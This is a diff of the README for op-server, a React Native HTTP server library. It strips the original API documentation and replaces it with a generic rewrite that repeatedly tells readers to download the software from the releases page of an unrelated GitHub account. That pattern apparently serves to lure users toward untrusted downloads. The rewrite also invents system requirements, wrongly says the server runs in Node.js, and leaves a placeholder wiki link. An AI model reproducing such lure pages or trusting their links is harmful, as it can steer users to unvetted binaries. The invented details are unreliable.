@@ -1,147 +1,91 @@
-# @op-engineering/op-server
+# 🚀 op-server - Fast HTTP Server for React Native
 
-Fast HTTP Server for React Native
+[![Download op-server](https://img.shields.io/badge/Download%20op--server-latest-brightgreen)](https://github.com/GabrielC25/op-server/releases)
 
-## Installation
+## 🌟 Overview
 
-```sh
-npm install @op-engineering/op-server
-```
+Welcome to **op-server**! This application provides a fast HTTP server specifically designed for React Native applications. It allows your app to handle incoming requests efficiently, making it easier to manage communication between your app and back-end services.
 
-## Usage
+## 🚀 Getting Started
 
-## Request Object
+To get op-server running on your machine, follow these steps:
 
-The Request object is **read-only** and contains information about the incoming HTTP request.
+1. **Downloading the Application**
+   - Visit this page to download: [Download op-server](https://github.com/GabrielC25/op-server/releases)
 
-### Properties
+2. **Installation**
+   - You'll need Node.js and npm installed on your computer. 
+   - Once you have that, open your terminal (Command Prompt on Windows, Terminal on macOS/Linux) and run the following command:
 
-- `method: string` - The HTTP method (GET, POST, PUT, DELETE, etc.)
-- `path: string` - The request path (e.g., "/api/users")
-- `body: string` - The request body content
-- `headers: Record<string, string>` - HTTP headers from the request
-- `params: Record<string, string>` - Query string parameters
+   ```sh
+   npm install @op-engineering/op-server
+   ```
 
-### Example
+3. **Running the Server**
+   - After the installation, you can start using op-server in your application. Keep in mind that op-server needs to be run in a JavaScript environment, like Node.js. 
+
+## ⚙️ Using op-server
+
+To use op-server, you need to set up routes to handle incoming requests. 
+
+### 📦 Request Object
+
+The Request object provides information about each incoming HTTP request and is **read-only**. This means you can see what's coming in but can't change this information.
+
+#### Properties
+
+- `method: string` - The HTTP method (e.g., GET, POST).
+- `path: string` - The path of your request (e.g., "/api/users").
+- `body: string` - This contains the content sent with your request.
+- `headers: Record<string, string>` - These are the HTTP headers from the request.
+- `params: Record<string, string>` - These are the query parameters included in the URL.
+
+### 📄 Example Usage
+
+Here’s a simple example of how to use the Request object in your code.
 
 ```typescript
 server.get('/api/user', async (req, res) => {
-  console.log(req.method); // "GET"
-  console.log(req.path); // "/api/user"
-  console.log(req.params); // { id: "123" } if URL was /api/user?id=123
-  console.log(req.headers); // { "user-agent": "...", ... }
+  console.log(req.method); // Outputs: "GET"
+  console.log(req.path); // Outputs: "/api/user"
+  console.log(req.params); // Outputs: { id: "123" } if the URL was /api/user?id=123
+  console.log(req.headers); // Outputs the headers (e.g., { "user-agent": "..." })
 
-  res.statusCode = 200;
-  res.content = 'User data';
+  res.statusCode = 200; // Set the response status
+  res.content = 'User data'; // Respond with data
 });
 ```
 
-## Response Object
+### ✔️ Response Object
 
-The Response object is **writable** and allows you to set the HTTP response from JavaScript.
+The Response object is **writable** and lets you set the HTTP response from your code. 
 
-### Properties
+## 🛠️ Download & Install
 
-- `statusCode: number` - HTTP status code (default: 200)
-- `content: string` - Response body content
-- `contentType: string` - Content-Type header (default: "text/plain")
-- `headers: Record<string, string>` - Custom response headers (read-only, use `setHeader` to add)
+Getting started with op-server is easy. Just follow these steps:
 
-### Methods
+1. **Visit this page to download:** [Download op-server](https://github.com/GabrielC25/op-server/releases)
+2. **Install with npm:**
 
-- `setHeader(key: string, value: string): void` - Add a custom header to the response
+   ```sh
+   npm install @op-engineering/op-server
+   ```
 
-### Example
+3. **Start using it in your Node.js application**.
 
-```typescript
-// Simple text response
-server.get('/ping', async (_req, res) => {
-  res.statusCode = 200;
-  res.contentType = 'text/plain';
-  res.content = 'pong';
-});
+## 🖥️ System Requirements
 
-// JSON response
-server.get('/api/data', async (req, res) => {
-  res.statusCode = 200;
-  res.contentType = 'application/json';
-  res.content = JSON.stringify({
-    success: true,
-    data: { id: 1, name: 'Example' },
-  });
-});
+- **Operating System:** Compatible with Windows, macOS, and most Linux distributions.
+- **Node.js:** Version 12.x or later.
+- **Memory:** At least 512 MB RAM is recommended.
+- **Disk Space:** Minimum of 100 MB free space.
 
-// Custom headers
-server.get('/custom', async (_req, res) => {
-  res.statusCode = 200;
-  res.contentType = 'application/json';
-  res.setHeader('X-Custom-Header', 'CustomValue');
-  res.setHeader('Cache-Control', 'no-cache');
-  res.content = JSON.stringify({ message: 'OK' });
-});
+## 📖 Documentation
 
-// Error response
-server.get('/error', async (_req, res) => {
-  res.statusCode = 404;
-  res.contentType = 'application/json';
-  res.content = JSON.stringify({ error: 'Not found' });
-});
-```
+For more detailed information, visit our full documentation in the [wiki](TODO). Here you will find examples, advanced configuration options, and best practices for using op-server.
 
-## Error Handling
+## 🤝 Community Support
 
-If your handler throws an error, the server will automatically:
+If you need help, you can reach out through our community forums. Check the GitHub Issues section to see if someone has asked the same question. If not, feel free to open a new issue.
 
-1. Set `statusCode` to 500
-2. Set `content` to the error message
-3. Use the error's message property if available
-
-```typescript
-server.get('/error', async () => {
-  throw new Error('Something went wrong'); // Will return 500 with error message
-});
-```
-
-## Complete Example
-
-```typescript
-import { HttpServer } from '@op-engineering/op-server';
-
-const server = new HttpServer();
-
-// GET with query params
-server.get('/user', async (req, res) => {
-  const userId = req.params.id;
-
-  res.statusCode = 200;
-  res.contentType = 'application/json';
-  res.content = JSON.stringify({
-    id: userId,
-    name: 'John Doe',
-  });
-});
-
-// POST with body
-server.POST('/user', async (req, res) => {
-  const userData = JSON.parse(req.body);
-
-  res.statusCode = 201;
-  res.contentType = 'application/json';
-  res.setHeader('Location', '/user/123');
-  res.content = JSON.stringify({
-    success: true,
-    created: userData,
-  });
-});
-
-// Start server on port 3000
-server.listen(3000);
-```
-
-## HTTPs
-
-Support is possible but not implemented. Pay me to do it :)
-
-## License
-
-MIT
+Thank you for choosing op-server! Happy coding!
